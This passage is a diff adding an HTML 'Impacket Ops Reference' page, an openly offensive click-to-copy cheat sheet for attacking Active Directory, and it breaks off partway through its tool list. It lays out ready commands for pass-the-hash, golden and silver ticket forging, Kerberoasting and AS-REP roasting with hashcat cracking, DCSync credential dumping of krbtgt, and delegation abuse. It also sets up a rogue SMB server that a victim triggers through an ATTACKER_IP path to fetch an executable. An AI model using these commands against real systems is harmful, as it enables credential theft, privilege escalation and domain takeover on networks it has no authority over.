@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>IMPACKET // OPS REFERENCE</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Russo+One&family=VT323&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:      #060a06;
+  --surface: #0a100a;
+  --card:    #0d140d;
+  --card2:   #101a10;
+  --border:  #1a2e1a;
+  --border2: #243824;
+  --green:   #00ff41;
+  --green2:  #00c832;
+  --green3:  #39ff14;
+  --dim:     #1a7a1a;
+  --dimmer:  #0d3d0d;
+  --amber:   #ffaa00;
+  --red:     #ff3030;
+  --cyan:    #00ffea;
+  --blue:    #3db8ff;
+  --purple:  #c87aff;
+  --text:    #a8d8a8;
+  --text2:   #6aaa6a;
+  --muted:   #2d5a2d;
+  --mono:    'Share Tech Mono', monospace;
+  --vt:      'VT323', monospace;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);font-size:15px;line-height:1.55;cursor:crosshair;min-height:100vh;overflow-x:hidden;}
+body::before{content:'';position:fixed;inset:0;background:repeating-linear-gradient(0deg,transparent,transparent 3px,rgba(0,255,65,.018) 3px,rgba(0,255,65,.018) 4px);pointer-events:none;z-index:9000;}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at center,transparent 55%,rgba(0,0,0,.75) 100%);pointer-events:none;z-index:9001;}
+
+/* HEADER */
+header{background:var(--surface);border-bottom:2px solid var(--green);padding:28px 48px 22px;position:sticky;top:0;z-index:100;box-shadow:0 0 40px rgba(0,255,65,.12);}
+@keyframes flicker{0%,100%{opacity:1}92%{opacity:1}93%{opacity:.85}94%{opacity:1}96%{opacity:.9}97%{opacity:1}}
+header{animation:flicker 8s infinite;}
+.header-top{display:flex;align-items:flex-start;justify-content:space-between;max-width:1600px;margin:0 auto 18px;gap:24px;}
+.logo-pre{font-family:var(--vt);font-size:14px;color:var(--dim);letter-spacing:3px;margin-bottom:2px;}
+h1{font-family:var(--vt);font-size:64px;color:var(--green);text-shadow:0 0 30px rgba(0,255,65,.6),0 0 60px rgba(0,255,65,.2);line-height:1;letter-spacing:4px;}
+h1 .slash{color:var(--amber);}
+h1 .sub{color:var(--green2);font-size:42px;}
+.logo-tagline{font-size:12px;color:var(--dim);letter-spacing:4px;margin-top:4px;text-transform:uppercase;}
+.header-right{display:flex;flex-direction:column;align-items:flex-end;gap:12px;}
+.sys-info{font-family:var(--vt);font-size:18px;color:var(--dim);text-align:right;line-height:1.4;}
+.sys-info span{color:var(--green2);}
+.status-row{display:flex;gap:10px;flex-wrap:wrap;justify-content:flex-end;}
+.badge{font-family:var(--vt);font-size:16px;padding:3px 14px;border:1px solid;letter-spacing:2px;text-transform:uppercase;}
+.badge-green{color:var(--green);border-color:var(--green);background:rgba(0,255,65,.06);}
+.badge-amber{color:var(--amber);border-color:var(--amber);background:rgba(255,170,0,.06);}
+.badge-red{color:var(--red);border-color:var(--red);background:rgba(255,48,48,.06);}
+.badge-cyan{color:var(--cyan);border-color:var(--cyan);background:rgba(0,255,234,.06);}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+.cursor{animation:blink 1s step-end infinite;color:var(--green);}
+
+/* TOOLBAR */
+.toolbar{max-width:1600px;margin:0 auto;display:flex;flex-direction:column;gap:12px;}
+.controls{display:flex;gap:14px;align-items:center;flex-wrap:wrap;}
+.search-wrap{flex:1;min-width:280px;position:relative;}
+.search-wrap::before{content:'>';position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--green);font-size:18px;font-family:var(--vt);}
+.search-wrap input{width:100%;background:var(--card);border:1px solid var(--border2);color:var(--green);font-family:var(--mono);font-size:15px;padding:11px 16px 11px 34px;outline:none;transition:all .2s;caret-color:var(--green);}
+.search-wrap input:focus{border-color:var(--green);box-shadow:0 0 16px rgba(0,255,65,.15),inset 0 0 16px rgba(0,255,65,.04);}
+.search-wrap input::placeholder{color:var(--muted);}
+.filter-bar{display:flex;gap:8px;flex-wrap:wrap;}
+.flt{font-family:var(--vt);font-size:17px;padding:6px 18px;border:1px solid var(--border2);background:var(--card);color:var(--muted);cursor:pointer;letter-spacing:2px;text-transform:uppercase;transition:all .15s;user-select:none;}
+.flt:hover{border-color:var(--green2);color:var(--green2);background:rgba(0,200,50,.06);}
+.flt.active{border-color:var(--green);color:var(--bg);background:var(--green);box-shadow:0 0 14px rgba(0,255,65,.4);}
+
+/* MAIN */
+main{max-width:1600px;margin:0 auto;padding:32px 48px 80px;}
+.stat-bar{display:flex;gap:28px;margin-bottom:28px;font-family:var(--vt);font-size:17px;color:var(--dim);border-bottom:1px solid var(--border);padding-bottom:12px;}
+.stat-bar .val{color:var(--green);font-size:20px;}
+
+/* CATEGORY */
+.cat-section{margin-bottom:52px;}
+.cat-header{display:flex;align-items:center;gap:16px;margin-bottom:20px;padding:12px 20px;border:1px solid;position:relative;overflow:hidden;}
+.cat-header::before{content:'';position:absolute;inset:0;opacity:.04;}
+.cat-kerberos .cat-header{border-color:var(--green);}     .cat-kerberos .cat-header::before{background:var(--green);}
+.cat-smb      .cat-header{border-color:var(--amber);}     .cat-smb      .cat-header::before{background:var(--amber);}
+.cat-ad       .cat-header{border-color:var(--purple);}    .cat-ad       .cat-header::before{background:var(--purple);}
+.cat-remote   .cat-header{border-color:var(--cyan);}      .cat-remote   .cat-header::before{background:var(--cyan);}
+.cat-mitm     .cat-header{border-color:var(--red);}       .cat-mitm     .cat-header::before{background:var(--red);}
+.cat-mssql    .cat-header{border-color:var(--blue);}      .cat-mssql    .cat-header::before{background:var(--blue);}
+.cat-misc     .cat-header{border-color:var(--text2);}     .cat-misc     .cat-header::before{background:var(--text2);}
+.cat-icon{font-size:22px;}
+.cat-label{font-family:var(--vt);font-size:28px;letter-spacing:3px;text-transform:uppercase;}
+.cat-kerberos .cat-label{color:var(--green);text-shadow:0 0 10px rgba(0,255,65,.5);}
+.cat-smb      .cat-label{color:var(--amber);text-shadow:0 0 10px rgba(255,170,0,.5);}
+.cat-ad       .cat-label{color:var(--purple);text-shadow:0 0 10px rgba(200,122,255,.5);}
+.cat-remote   .cat-label{color:var(--cyan);text-shadow:0 0 10px rgba(0,255,234,.5);}
+.cat-mitm     .cat-label{color:var(--red);text-shadow:0 0 10px rgba(255,48,48,.5);}
+.cat-mssql    .cat-label{color:var(--blue);text-shadow:0 0 10px rgba(61,184,255,.5);}
+.cat-misc     .cat-label{color:var(--text2);text-shadow:0 0 10px rgba(106,170,106,.5);}
+.cat-count-badge{margin-left:auto;font-family:var(--vt);font-size:16px;padding:2px 14px;border:1px solid var(--border2);color:var(--muted);background:var(--bg);}
+
+/* GRID */
+.tools-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(520px,1fr));gap:16px;}
+
+/* TOOL CARD */
+.tool-card{background:var(--card);border:1px solid var(--border);padding:22px 24px;position:relative;transition:border-color .2s,box-shadow .2s,background .2s;overflow:hidden;}
+.tool-card::before{content:'';position:absolute;top:0;left:0;bottom:0;width:4px;}
+.cat-kerberos .tool-card::before{background:var(--green);box-shadow:0 0 8px var(--green);}
+.cat-smb      .tool-card::before{background:var(--amber);box-shadow:0 0 8px var(--amber);}
+.cat-ad       .tool-card::before{background:var(--purple);box-shadow:0 0 8px var(--purple);}
+.cat-remote   .tool-card::before{background:var(--cyan);box-shadow:0 0 8px var(--cyan);}
+.cat-mitm     .tool-card::before{background:var(--red);box-shadow:0 0 8px var(--red);}
+.cat-mssql    .tool-card::before{background:var(--blue);box-shadow:0 0 8px var(--blue);}
+.cat-misc     .tool-card::before{background:var(--text2);box-shadow:0 0 8px var(--text2);}
+.tool-card:hover{background:var(--card2);}
+.cat-kerberos .tool-card:hover{border-color:rgba(0,255,65,.4);box-shadow:0 0 20px rgba(0,255,65,.06);}
+.cat-smb      .tool-card:hover{border-color:rgba(255,170,0,.4);box-shadow:0 0 20px rgba(255,170,0,.06);}
+.cat-ad       .tool-card:hover{border-color:rgba(200,122,255,.4);box-shadow:0 0 20px rgba(200,122,255,.06);}
+.cat-remote   .tool-card:hover{border-color:rgba(0,255,234,.4);box-shadow:0 0 20px rgba(0,255,234,.06);}
+.cat-mitm     .tool-card:hover{border-color:rgba(255,48,48,.4);box-shadow:0 0 20px rgba(255,48,48,.06);}
+.cat-mssql    .tool-card:hover{border-color:rgba(61,184,255,.4);box-shadow:0 0 20px rgba(61,184,255,.06);}
+.cat-misc     .tool-card:hover{border-color:rgba(106,170,106,.4);box-shadow:0 0 20px rgba(106,170,106,.06);}
+.tool-card.hidden{display:none;}
+.tool-name{font-family:var(--vt);font-size:22px;letter-spacing:1px;margin-bottom:5px;}
+.cat-kerberos .tool-name{color:var(--green);}
+.cat-smb      .tool-name{color:var(--amber);}
+.cat-ad       .tool-name{color:var(--purple);}
+.cat-remote   .tool-name{color:var(--cyan);}
+.cat-mitm     .tool-name{color:var(--red);}
+.cat-mssql    .tool-name{color:var(--blue);}
+.cat-misc     .tool-name{color:var(--text2);}
+.tool-desc{font-size:13px;color:var(--text2);margin-bottom:16px;line-height:1.5;border-left:2px solid var(--border2);padding-left:10px;}
+
+/* CMD */
+.cmd-block{background:var(--bg);border:1px solid var(--border);padding:11px 14px;margin-bottom:8px;cursor:pointer;position:relative;transition:border-color .15s,background .15s;}
+.cmd-block:last-child{margin-bottom:0;}
+.cmd-block:hover{background:#0a120a;}
+.cat-kerberos .cmd-block:hover{border-color:rgba(0,255,65,.35);}
+.cat-smb      .cmd-block:hover{border-color:rgba(255,170,0,.35);}
+.cat-ad       .cmd-block:hover{border-color:rgba(200,122,255,.35);}
+.cat-remote   .cmd-block:hover{border-color:rgba(0,255,234,.35);}
+.cat-mitm     .cmd-block:hover{border-color:rgba(255,48,48,.35);}
+.cat-mssql    .cmd-block:hover{border-color:rgba(61,184,255,.35);}
+.cat-misc     .cmd-block:hover{border-color:rgba(106,170,106,.35);}
+.cmd-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;}
+.cmd-label{font-family:var(--vt);font-size:13px;color:var(--muted);letter-spacing:1.5px;text-transform:uppercase;}
+.copy-hint{font-family:var(--vt);font-size:13px;color:var(--muted);opacity:0;transition:opacity .2s;text-transform:uppercase;letter-spacing:1px;}
+.cmd-block:hover .copy-hint{opacity:1;}
+.cmd-text{font-family:var(--mono);font-size:14px;color:var(--text);line-height:1.8;white-space:pre-wrap;word-break:break-all;}
+.cmd-text .prog{color:var(--green3);font-weight:bold;}
+.cmd-text .flag{color:var(--amber);}
+.cmd-text .val{color:var(--cyan);}
+.cmd-text .comment{color:var(--muted);font-style:italic;}
+
+/* TOAST */
+.toast{position:fixed;bottom:32px;right:32px;background:var(--green);color:var(--bg);font-family:var(--vt);font-size:20px;letter-spacing:3px;padding:12px 28px;z-index:9999;opacity:0;transform:translateY(14px);transition:all .25s;pointer-events:none;text-transform:uppercase;box-shadow:0 0 30px rgba(0,255,65,.5);}
+.toast.show{opacity:1;transform:translateY(0);}
+.no-results{display:none;text-align:center;padding:80px;font-family:var(--vt);font-size:28px;color:var(--muted);letter-spacing:4px;}
+::-webkit-scrollbar{width:6px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border2);}
+::-webkit-scrollbar-thumb:hover{background:var(--dim);}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-top">
+    <div class="logo-block">
+      <div class="logo-pre">[ ACTIVE DIRECTORY ATTACK REFERENCE ]</div>
+      <h1>IMPACKET <span class="slash">//</span> <span class="sub">OPS</span><span class="cursor">_</span></h1>
+      <div class="logo-tagline">KALI LINUX FORMAT &nbsp;·&nbsp; ALL TOOLS &nbsp;·&nbsp; CLICK TO COPY</div>
+    </div>
+    <div class="header-right">
+      <div class="sys-info" id="sysInfo">
+        PLATFORM: <span>KALI LINUX</span><br>
+        FORMAT: <span>impacket-toolname</span><br>
+        VERSION: <span>0.12.x</span>
+      </div>
+      <div class="status-row">
+        <span class="badge badge-green">KERBEROS</span>
+        <span class="badge badge-amber">SMB / RPC</span>
+        <span class="badge badge-red">MITM / RELAY</span>
+        <span class="badge badge-cyan">REMOTE EXEC</span>
+      </div>
+    </div>
+  </div>
+  <div class="toolbar">
+    <div class="controls">
+      <div class="search-wrap">
+        <input type="text" id="searchInput" placeholder="search tools, flags, techniques...">
+      </div>
+    </div>
+    <div class="filter-bar" id="filterBar">
+      <button class="flt active" data-cat="all">ALL</button>
+      <button class="flt" data-cat="kerberos">&#127915; KERBEROS</button>
+      <button class="flt" data-cat="smb">&#128193; SMB / RPC</button>
+      <button class="flt" data-cat="ad">&#127963; ACTIVE DIR</button>
+      <button class="flt" data-cat="remote">&#128187; REMOTE EXEC</button>
+      <button class="flt" data-cat="mitm">&#128376; MITM / RELAY</button>
+      <button class="flt" data-cat="mssql">&#128450; MSSQL</button>
+      <button class="flt" data-cat="misc">&#128295; MISC</button>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="stat-bar">
+    <div>TOOLS:&nbsp;<span class="val" id="totalCount">0</span></div>
+    <div>VISIBLE:&nbsp;<span class="val" id="visibleCount">0</span></div>
+    <div>CATEGORIES:&nbsp;<span class="val">7</span></div>
+  </div>
+  <div id="mainContent"></div>
+  <div class="no-results" id="noResults">[ NO RESULTS FOUND ]</div>
+</main>
+
+<div class="toast" id="toast">// COPIED</div>
+
+<script>
+const CATS={kerberos:{label:'KERBEROS ATTACKS',icon:'&#127915;'},smb:{label:'SMB / RPC',icon:'&#128193;'},ad:{label:'ACTIVE DIRECTORY',icon:'&#127963;'},remote:{label:'REMOTE EXECUTION',icon:'&#128187;'},mitm:{label:'MITM / RELAY',icon:'&#128376;'},mssql:{label:'MSSQL',icon:'&#128450;'},misc:{label:'MISC / CRYPTO',icon:'&#128295;'}};
+
+const TOOLS=[
+  /* KERBEROS */
+  {cat:'kerberos',name:'impacket-getTGT',desc:'Request a Ticket Granting Ticket (TGT). Outputs a .ccache file usable via KRB5CCNAME.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-getTGT <v>DOMAIN.LOCAL</v>/<v>username</v>:<v>Password123</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-getTGT <v>DOMAIN.LOCAL</v>/<v>username</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'AES key',cmd:`impacket-getTGT <v>DOMAIN.LOCAL</v>/<v>username</v> <f>-aesKey</f> <v>aeskey256</v>`},{lbl:'Export ticket',cmd:`export KRB5CCNAME=<v>username.ccache</v>`}]},
+  {cat:'kerberos',name:'impacket-getST',desc:'Request a Service Ticket. Core tool for delegation abuse — S4U2Self, S4U2Proxy, RBCD.',
+   cmds:[{lbl:'Basic SPN ticket',cmd:`impacket-getST <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-spn</f> <v>cifs/dc01.domain.local</v>`},{lbl:'S4U2Self impersonation',cmd:`impacket-getST <v>DOMAIN.LOCAL</v>/<v>svcacct</v>:<v>pass</v> <f>-spn</f> <v>cifs/dc01</v> <f>-impersonate</f> <v>Administrator</v>`},{lbl:'Hash + impersonate',cmd:`impacket-getST <v>DOMAIN.LOCAL</v>/<v>svcacct</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-spn</f> <v>cifs/dc01</v> <f>-impersonate</f> <v>Administrator</v>`},{lbl:'RBCD (alt service)',cmd:`impacket-getST <v>DOMAIN.LOCAL</v>/<v>MACHINENAME$</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-spn</f> <v>cifs/target.domain.local</v> <f>-impersonate</f> <v>Administrator</v> <f>-altservice</f> <v>ldap</v>`},{lbl:'Kerberos auth',cmd:`impacket-getST <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-k</f> <f>-no-pass</f> <f>-spn</f> <v>cifs/dc01</v> <f>-impersonate</f> <v>Administrator</v>`}]},
+  {cat:'kerberos',name:'impacket-ticketer',desc:'Forge Golden Tickets (krbtgt hash) or Silver Tickets (service account hash). Full offline ticket creation.',
+   cmds:[{lbl:'Golden Ticket',cmd:`impacket-ticketer <f>-nthash</f> <v>krbtgt_ntlm</v> <f>-domain-sid</f> <v>S-1-5-21-xxx</v> <f>-domain</f> <v>DOMAIN.LOCAL</v> <v>Administrator</v>`},{lbl:'Silver Ticket (cifs)',cmd:`impacket-ticketer <f>-nthash</f> <v>svc_ntlm</v> <f>-domain-sid</f> <v>S-1-5-21-xxx</v> <f>-domain</f> <v>DOMAIN.LOCAL</v> <f>-spn</f> <v>cifs/dc01.domain.local</v> <v>Administrator</v>`},{lbl:'AES Golden Ticket',cmd:`impacket-ticketer <f>-aesKey</f> <v>krbtgt_aes256</v> <f>-domain-sid</f> <v>S-1-5-21-xxx</v> <f>-domain</f> <v>DOMAIN.LOCAL</v> <v>Administrator</v>`},{lbl:'Custom SID groups',cmd:`impacket-ticketer <f>-nthash</f> <v>krbtgt_ntlm</v> <f>-domain-sid</f> <v>S-1-5-21-xxx</v> <f>-domain</f> <v>DOMAIN.LOCAL</v> <f>-extra-sid</f> <v>S-1-5-21-xxx-519</v> <v>Administrator</v>`},{lbl:'Use the ticket',cmd:`export KRB5CCNAME=<v>Administrator.ccache</v>`}]},
+  {cat:'kerberos',name:'impacket-GetNPUsers',desc:'ASREPRoasting — dump hashes for users without Kerberos pre-auth required.',
+   cmds:[{lbl:'With creds (all users)',cmd:`impacket-GetNPUsers <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-request</f> <f>-format</f> <v>hashcat</v> <f>-outputfile</f> <v>asrep.txt</v>`},{lbl:'No creds (userlist)',cmd:`impacket-GetNPUsers <v>DOMAIN.LOCAL</v>/ <f>-no-pass</f> <f>-usersfile</f> <v>users.txt</v> <f>-format</f> <v>hashcat</v>`},{lbl:'DC target',cmd:`impacket-GetNPUsers <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-dc-ip</f> <v>10.10.10.10</v> <f>-request</f>`},{lbl:'Crack hash',cmd:`hashcat <f>-m</f> <v>18200</v> <v>asrep.txt</v> <v>rockyou.txt</v>`}]},
+  {cat:'kerberos',name:'impacket-GetUserSPNs',desc:'Kerberoasting — enumerate SPNs and request TGS tickets for offline cracking.',
+   cmds:[{lbl:'Enumerate SPNs',cmd:`impacket-GetUserSPNs <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>`},{lbl:'Request TGS hashes',cmd:`impacket-GetUserSPNs <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-request</f> <f>-outputfile</f> <v>tgs.txt</v>`},{lbl:'Target specific user',cmd:`impacket-GetUserSPNs <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-request-user</f> <v>svcmssql</v>`},{lbl:'Hash auth',cmd:`impacket-GetUserSPNs <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-request</f>`},{lbl:'Crack TGS',cmd:`hashcat <f>-m</f> <v>13100</v> <v>tgs.txt</v> <v>rockyou.txt</v>`}]},
+  {cat:'kerberos',name:'impacket-ticketConverter',desc:'Convert tickets between Linux .ccache (impacket) and Windows .kirbi (Mimikatz) formats.',
+   cmds:[{lbl:'.ccache → .kirbi',cmd:`impacket-ticketConverter <v>ticket.ccache</v> <v>ticket.kirbi</v>`},{lbl:'.kirbi → .ccache',cmd:`impacket-ticketConverter <v>ticket.kirbi</v> <v>ticket.ccache</v>`}]},
+  {cat:'kerberos',name:'impacket-findDelegation',desc:'Enumerate accounts with unconstrained, constrained, or resource-based constrained delegation.',
+   cmds:[{lbl:'Find delegation',cmd:`impacket-findDelegation <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>`},{lbl:'Hash auth',cmd:`impacket-findDelegation <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'Kerberos',cmd:`impacket-findDelegation <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-k</f> <f>-no-pass</f>`}]},
+  {cat:'kerberos',name:'impacket-raiseChild',desc:'Escalate from child domain to forest root Domain Admin via SID history injection.',
+   cmds:[{lbl:'Child → root DA',cmd:`impacket-raiseChild <v>child.domain.local</v>/<v>Administrator</v>:<v>pass</v>`},{lbl:'With exec target',cmd:`impacket-raiseChild <f>-target-exec</f> <v>dc.root.local</v> <v>child.domain.local</v>/<v>Administrator</v>:<v>pass</v>`}]},
+  {cat:'kerberos',name:'impacket-getPac',desc:'Retrieve PAC (Privilege Attribute Certificate) from a Kerberos ticket to inspect group memberships.',
+   cmds:[{lbl:'Get PAC',cmd:`impacket-getPac <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-targetUser</f> <v>Administrator</v>`}]},
+  {cat:'kerberos',name:'impacket-keylistattack',desc:'AES key list attack against read-only domain controllers (RODCs).',
+   cmds:[{lbl:'Key list attack',cmd:`impacket-keylistattack <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-rodcKey</f> <v>rodcAESkey</v> <f>-rodcNo</f> <v>20001</v> <f>-usersfile</f> <v>users.txt</v> <f>-outputfile</f> <v>hashes.txt</v>`}]},
+
+  /* SMB */
+  {cat:'smb',name:'impacket-smbclient',desc:'Interactive SMB file browser. List shares, navigate, upload/download files.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-smbclient <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-smbclient <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'Kerberos',cmd:`impacket-smbclient <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>dc01.domain.local</v> <f>-k</f> <f>-no-pass</f>`},{lbl:'Shell commands',cmd:`<c># shares / use C$ / ls / get file.txt / put evil.exe / exit</c>`}]},
+  {cat:'smb',name:'impacket-smbserver',desc:'Spin up a rogue SMB server for file serving or capturing NTLM hashes.',
+   cmds:[{lbl:'Basic share',cmd:`impacket-smbserver <v>SHARE</v> <v>/tmp/files</v>`},{lbl:'SMBv2 (modern OS)',cmd:`impacket-smbserver <v>SHARE</v> <v>/tmp/files</v> <f>-smb2support</f>`},{lbl:'With auth',cmd:`impacket-smbserver <v>SHARE</v> <v>.</v> <f>-smb2support</f> <f>-username</f> <v>user</v> <f>-password</f> <v>pass</v>`},{lbl:'Trigger from victim',cmd:`<c>// \\\\ATTACKER_IP\\SHARE\\file.exe  (UNC path)</c>`}]},
+  {cat:'smb',name:'impacket-secretsdump',desc:'Remote credential dump — SAM, LSA, cached creds, NTDS.dit (DCSync). Most powerful impacket tool.',
+   cmds:[{lbl:'Password (remote)',cmd:`impacket-secretsdump <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-secretsdump <v>DOMAIN.LOCAL</v>/<v>Administrator</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`},{lbl:'DCSync (NTLM only)',cmd:`impacket-secretsdump <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>dc01</v> <f>-just-dc-ntlm</f>`},{lbl:'DCSync specific user',cmd:`impacket-secretsdump <v>DOMAIN.LOCAL</v>/<v>Administrator</v>:<v>pass</v>@<v>dc01</v> <f>-just-dc-user</f> <v>krbtgt</v>`},{lbl:'Kerberos auth',cmd:`impacket-secretsdump <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>dc01.domain.local</v> <f>-k</f> <f>-no-pass</f>`},{lbl:'Offline (SAM hives)',cmd:`impacket-secretsdump <f>-sam</f> <v>SAM</v> <f>-system</f> <v>SYSTEM</v> <f>-security</f> <v>SECURITY</v> <v>LOCAL</v>`}]},
+  {cat:'smb',name:'impacket-samrdump',desc:'Enumerate domain users, groups, and password policy via SAMR protocol.',
+   cmds:[{lbl:'Password auth',cmd:`impacket-samrdump <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Pass-the-Hash',cmd:`impacket-samrdump <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`}]},
+  {cat:'smb',name:'impacket-rpcdump',desc:'Dump all registered RPC endpoints on a target.',
+   cmds:[{lbl:'Standard',cmd:`impacket-rpcdump <f>-port</f> <v>135</v> <v>192.168.1.10</v>`},{lbl:'SMB transport',cmd:`impacket-rpcdump <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v>`}]},
+  {cat:'smb',name:'impacket-lookupsid',desc:'Brute-force SID lookup to enumerate domain users and groups.',
+   cmds:[{lbl:'Authenticated',cmd:`impacket-lookupsid <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v>`},{lbl:'Anonymous',cmd:`impacket-lookupsid <v>anonymous</v>@<v>192.168.1.10</v>`},{lbl:'Hash auth',cmd:`impacket-lookupsid <v>DOMAIN.LOCAL</v>/<v>user</v>@<v>192.168.1.10</v> <f>-hashes</f> <v>:ntlmhash</v>`}]},
+  {cat:'smb',name:'impacket-reg',desc:'Remote registry read/write/delete via WINREG protocol.',
+   cmds:[{lbl:'Query key',cmd:`impacket-reg <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> query <f>-keyName</f> <v>HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion</v>`},{lbl:'Add value',cmd:`impacket-reg <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> add <f>-keyName</f> <v>HKLM\\\\...</v> <f>-v</f> <v>Name</v> <f>-vd</f> <v>data</v>`},{lbl:'Delete value',cmd:`impacket-reg <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>@<v>192.168.1.10</v> delete <f>-keyName</f> <v>HKLM\\\\...</v> <f>-v</f> <v>Name</v>`}]},
+  {cat:'smb',name:'impacket-netview',desc:'Enumerate logged-on users and active sessions across domain hosts.',
+   cmds:[{lbl:'Enumerate all',cmd:`impacket-netview <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v>`},{lbl:'Target host',cmd:`impacket-netview <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-target</f> <v>192.168.1.10</v>`}]},
+  {cat:'smb',name:'impacket-rpcmap',desc:'Map RPC endpoints and interfaces exposed on a remote host.',
+   cmds:[{lbl:'TCP endpoint',cmd:`impacket-rpcmap <v>ncacn_ip_tcp</v>:<v>192.168.1.10</v>`},{lbl:'With NTLM auth',cmd:`impacket-rpcmap <v>ncacn_ip_tcp</v>:<v>192.168.1.10</v> <f>-auth-transport</f> <v>NTLM</v>`}]},
+
+  /* AD */
+  {cat:'ad',name:'impacket-GetADUsers',desc:'Enumerate all Active Directory users via LDAP. Dump user attributes.',
+   cmds:[{lbl:'All users',cmd:`impacket-GetADUsers <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-all</f>`},{lbl:'Hash auth',cmd:`impacket-GetADUsers <v>DOMAIN.LOCAL</v>/<v>user</v> <f>-hashes</f> <v>:ntlmhash</v> <f>-all</f>`},{lbl:'DC target',cmd:`impacket-GetADUsers <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-dc-ip</f> <v>10.10.10.10</v> <f>-all</f>`}]},
+  {cat:'ad',name:'impacket-ldapdomaindump',desc:'Dump entire domain to JSON/HTML/CSV — users, groups, computers, GPOs.',
+   cmds:[{lbl:'Full dump',cmd:`impacket-ldapdomaindump <f>-u</f> <v>DOMAIN.LOCAL\\\\user</v> <f>-p</f> <v>pass</v> <v>192.168.1.10</v>`},{lbl:'Hash auth',cmd:`impacket-ldapdomaindump <f>-u</f> <v>DOMAIN.LOCAL\\\\user</v> <f>-p</f> <v>aad3b435...:ntlmhash</v> <v>192.168.1.10</v>`},{lbl:'Output dir',cmd:`impacket-ldapdomaindump <f>-u</f> <v>DOMAIN\\\\user</v> <f>-p</f> <v>pass</v> <v>192.168.1.10</v> <f>-o</f> <v>./dump/</v>`}]},
+  {cat:'ad',name:'impacket-rbcd',desc:'Set/Read/Remove Resource-Based Constrained Delegation (RBCD) on accounts.',
+   cmds:[{lbl:'Set RBCD',cmd:`impacket-rbcd <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>write</v> <f>-delegate-to</f> <v>target$</v> <f>-delegate-from</f> <v>EVILPC$</v>`},{lbl:'Read RBCD',cmd:`impacket-rbcd <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>read</v> <f>-delegate-to</f> <v>target$</v>`},{lbl:'Remove RBCD',cmd:`impacket-rbcd <v>DOMAIN.LOCAL</v>/<v>user</v>:<v>pass</v> <f>-action</f> <v>remove</v> <f>-delegate-to</f> <v>target$</v> <f>-delegate-from</f> <v>EVILPC$</v>`}]},
+  {cat:'ad',name:'impacket-addcomputer',desc:'Add a machine account to the domain. Essential for RBCD and other delegation attacks.',
